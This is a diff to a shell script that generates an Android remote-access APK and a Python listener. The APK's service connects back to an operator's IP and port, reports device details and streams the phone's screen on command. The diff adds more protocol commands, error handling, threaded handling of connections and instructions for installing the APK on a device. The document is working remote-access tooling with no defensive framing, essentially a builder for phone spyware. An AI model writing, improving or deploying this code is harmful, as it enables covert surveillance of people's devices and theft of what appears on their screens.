@@ -146,7 +146,7 @@ EOF
     wget -q https://raw.githubusercontent.com/gradle/gradle/v8.6.0/gradle/wrapper/gradle-wrapper.jar
     cd $PROJECT_DIR
 
-    # Create SIMPLIFIED gradlew script that works
+    # Create SIMPLIFIED gradlew script
     cat > gradlew << 'EOF'
 #!/bin/sh
 DIR="$(cd "$(dirname "$0")" && pwd)"
@@ -448,15 +448,25 @@ public class RemoteService extends Service {
                 dataOut = new DataOutputStream(socket.getOutputStream());
                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                 
-                dataOut.write(("DEVICE_INFO:" + android.os.Build.MANUFACTURER + "|" + 
-                              android.os.Build.MODEL + "|" + android.os.Build.VERSION.RELEASE + "\n").getBytes());
+                String deviceInfo = "DEVICE_INFO:" + android.os.Build.MANUFACTURER + "|" + 
+                                   android.os.Build.MODEL + "|" + android.os.Build.VERSION.RELEASE + "\n";
+                dataOut.write(deviceInfo.getBytes());
+                dataOut.flush();
                 
                 String command;
                 while (isRunning && (command = in.readLine()) != null) {
+                    Log.d(TAG, "Received command: " + command);
                     if (command.equals("START_STREAM")) {
                         startScreenStream();
+                        dataOut.write("STREAM_STARTED\n".getBytes());
+                        dataOut.flush();
                     } else if (command.equals("STOP_STREAM")) {
                         isStreaming = false;
+                        dataOut.write("STREAM_STOPPED\n".getBytes());
+                        dataOut.flush();
+                    } else if (command.equals("PING")) {
+                        dataOut.write("PONG\n".getBytes());
+                        dataOut.flush();
                     } else if (command.equals("EXIT")) {
                         isRunning = false;
                         stopSelf();
@@ -465,6 +475,8 @@ public class RemoteService extends Service {
             } catch (Exception e) {
                 Log.e(TAG, "Connection error", e);
                 try { Thread.sleep(5000); } catch (Exception ignored) {}
+            } finally {
+                try { if (socket != null) socket.close(); } catch (Exception ignored) {}
             }
         }
     }
@@ -532,7 +544,7 @@ EOF
     echo -e "${GREEN}✓ Java code created${NC}"
 }
 
-# Build the APK using gradle wrapper
+# Build the APK using gradle wrapper with error output
 build_apk() {
     echo -e "${YELLOW}[5/8] Building APK with Gradle 8.6 wrapper...${NC}"
     
@@ -541,17 +553,46 @@ build_apk() {
     # Make gradlew executable
     chmod +x gradlew
     
-    # Build the APK
-    echo "Running ./gradlew assembleRelease..."
-    ./gradlew assembleRelease --no-daemon
+    # Show Java version
+    echo "Java version:"
+    java -version
     
-    # Check if build succeeded
-    if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
-        cp app/build/outputs/apk/release/app-release.apk "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
-        echo -e "${GREEN}✓ APK built successfully${NC}"
-        echo "APK saved to: $HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
+    # Show gradle version
+    echo "Gradle wrapper version:"
+    ./gradlew --version
+    
+    # Build the APK with full error output
+    echo "Running ./gradlew assembleRelease --stacktrace..."
+    ./gradlew assembleRelease --stacktrace
+    
+    # Check build result
+    if [ $? -eq 0 ]; then
+        if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
+            cp app/build/outputs/apk/release/app-release.apk "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
+            echo -e "${GREEN}✓ APK built successfully${NC}"
+            echo "APK saved to: $HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
+        else
+            echo -e "${RED}APK file not found after successful build?${NC}"
+            find app/build/outputs -type f -name "*.apk"
+            exit 1
+        fi
     else
         echo -e "${RED}Failed to build APK${NC}"
+        echo "Checking for error logs..."
+        
+        # Look for common error logs
+        if [ -f "app/build/outputs/logs/manifest-merger-release-report.txt" ]; then
+            echo -e "${YELLOW}Manifest merger errors:${NC}"
+            cat "app/build/outputs/logs/manifest-merger-release-report.txt"
+        fi
+        
+        # Look for any build errors in the gradle output
+        if [ -f "app/build/reports/errors.txt" ]; then
+            cat "app/build/reports/errors.txt"
+        fi
+        
+        # Keep the project directory for inspection
+        echo -e "${YELLOW}Project directory preserved for debugging: $PROJECT_DIR${NC}"
         exit 1
     fi
 }
@@ -585,6 +626,7 @@ import struct
 import tkinter as tk
 from PIL import Image, ImageTk
 import queue
+import time
 
 LISTENER_IP = "$LISTENER_IP"
 LISTENER_PORT = $LISTENER_PORT
@@ -630,87 +672,157 @@ class RemoteClient:
     
     def handle(self):
         print(f"\n[+] Connected to {self.addr}")
+        
+        # Get device info
+        try:
+            data = self.conn.recv(1024).decode().strip()
+            if data.startswith("DEVICE_INFO:"):
+                print(f"[Device] {data[12:]}")
+        except:
+            pass
+        
         threading.Thread(target=self.command_loop).start()
         
         while self.running:
             try:
                 if self.streaming:
-                    size_data = self.conn.recv(4)
-                    if not size_data: continue
-                    img_size = struct.unpack('!I', size_data)[0]
-                    
-                    img_data = b''
-                    remaining = img_size
-                    while remaining > 0:
-                        chunk = self.conn.recv(min(8192, remaining))
-                        img_data += chunk
-                        remaining -= len(chunk)
-                    
-                    img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
-                    if img is not None and self.viewer:
-                        self.viewer.image_queue.put(img)
-            except: break
+                    # Set timeout for streaming
+                    self.conn.settimeout(1.0)
+                    try:
+                        size_data = self.conn.recv(4)
+                        if not size_data or len(size_data) < 4:
+                            continue
+                        img_size = struct.unpack('!I', size_data)[0]
+                        
+                        img_data = b''
+                        remaining = img_size
+                        while remaining > 0:
+                            chunk = self.conn.recv(min(8192, remaining))
+                            if not chunk:
+                                break
+                            img_data += chunk
+                            remaining -= len(chunk)
+                        
+                        if len(img_data) == img_size:
+                            img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
+                            if img is not None and self.viewer:
+                                self.viewer.image_queue.put(img)
+                    except socket.timeout:
+                        pass
+                    finally:
+                        self.conn.settimeout(None)
+                else:
+                    time.sleep(0.1)
+            except Exception as e:
+                print(f"Stream error: {e}")
+                break
         
         self.conn.close()
-        print(f"[-] Disconnected")
+        print(f"[-] Disconnected from {self.addr}")
     
     def command_loop(self):
         while self.running:
-            cmd = input(f"\033[92m{self.addr[0]}>\033[0m ")
-            if cmd == "stream":
-                self.conn.send(b"START_STREAM\n")
-                self.streaming = True
-                self.viewer = ScreenViewer()
-                threading.Thread(target=self.viewer.show).start()
-                print("[*] Streaming started")
-            elif cmd == "stop":
-                self.conn.send(b"STOP_STREAM\n")
-                self.streaming = False
-                if self.viewer: self.viewer.root.quit()
-            elif cmd == "exit":
-                self.conn.send(b"EXIT\n")
-                self.running = False
+            try:
+                cmd = input(f"\033[92m{self.addr[0]}>\033[0m ")
+                if cmd == "stream":
+                    self.conn.send(b"START_STREAM\n")
+                    self.streaming = True
+                    self.viewer = ScreenViewer()
+                    threading.Thread(target=self.viewer.show).start()
+                    print("[*] Streaming started")
+                elif cmd == "stop":
+                    self.conn.send(b"STOP_STREAM\n")
+                    self.streaming = False
+                    if self.viewer:
+                        self.viewer.root.quit()
+                    print("[*] Streaming stopped")
+                elif cmd == "ping":
+                    self.conn.send(b"PING\n")
+                elif cmd == "exit":
+                    self.conn.send(b"EXIT\n")
+                    self.running = False
+                    break
+                else:
+                    print("Unknown command. Available: stream, stop, ping, exit")
+            except Exception as e:
+                print(f"Command error: {e}")
                 break
 
 def start_server():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((LISTENER_IP, LISTENER_PORT))
+    try:
+        server.bind((LISTENER_IP, LISTENER_PORT))
+    except Exception as e:
+        print(f"Failed to bind to {LISTENER_IP}:{LISTENER_PORT}")
+        print(f"Error: {e}")
+        print("Try using 0.0.0.0 instead of your IP for the listener")
+        return
+    
     server.listen(5)
-    print(f"\nListening on {LISTENER_IP}:{LISTENER_PORT}\n")
+    print(f"\n\033[92mListening on {LISTENER_IP}:{LISTENER_PORT}\033[0m\n")
     
     while True:
         conn, addr = server.accept()
-        RemoteClient(conn, addr).handle()
+        print(f"\n[+] New connection from {addr}")
+        client = RemoteClient(conn, addr)
+        threading.Thread(target=client.handle).start()
 
 if __name__ == "__main__":
     start_server()
 EOF
 
     chmod +x ~/android-listener.py
-    echo -e "${GREEN}✓ Listener created${NC}"
+    echo -e "${GREEN}✓ Listener created at ~/android-listener.py${NC}"
 }
 
 # Show instructions
 show_instructions() {
+    APK_PATH="$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
+    
     clear
     echo -e "${GREEN}"
     echo "╔════════════════════════════════════════════╗"
     echo "║              SETUP COMPLETE!               ║"
     echo "╚════════════════════════════════════════════╝"
     echo -e "${NC}"
-    echo -e "${YELLOW}APK:${NC} $HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
-    echo -e "${YELLOW}Listener:${NC} python3 ~/android-listener.py"
+    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${YELLOW}APK File:${NC}"
+    echo "  $APK_PATH"
+    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    echo -e "\n${GREEN}INSTALLATION:${NC}"
+    echo "1. Transfer APK to Android device:"
+    echo "   • adb install $APK_PATH"
+    echo "   • python3 -m http.server 8000 (then download from http://$LISTENER_IP:8000)"
     echo ""
-    echo "Commands: stream - Start screen viewing"
-    echo "          stop   - Stop streaming"
-    echo "          exit   - Disconnect"
+    echo "2. On Android device:"
+    echo "   • Install the APK"
+    echo "   • Open the app once"
+    echo "   • Grant screen capture permission"
+    echo ""
+    echo -e "${GREEN}START LISTENER:${NC}"
+    echo "  python3 ~/android-listener.py"
+    echo ""
+    echo -e "${YELLOW}COMMANDS:${NC}"
+    echo "  stream  - Start screen viewing"
+    echo "  stop    - Stop streaming"
+    echo "  ping    - Test connection"
+    echo "  exit    - Disconnect"
+    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 }
 
 # Main
 main() {
     clear
-    echo -e "${BLUE}Android Remote Access APK Generator${NC}\n"
+    echo -e "${BLUE}"
+    echo "╔════════════════════════════════════════════╗"
+    echo "║  Android Remote Access with Screen Stream  ║"
+    echo "╚════════════════════════════════════════════╝"
+    echo -e "${NC}"
+    echo "Listener IP: $LISTENER_IP"
+    echo "Listener Port: $LISTENER_PORT"
+    echo ""
     
     check_java_version
     check_requirements
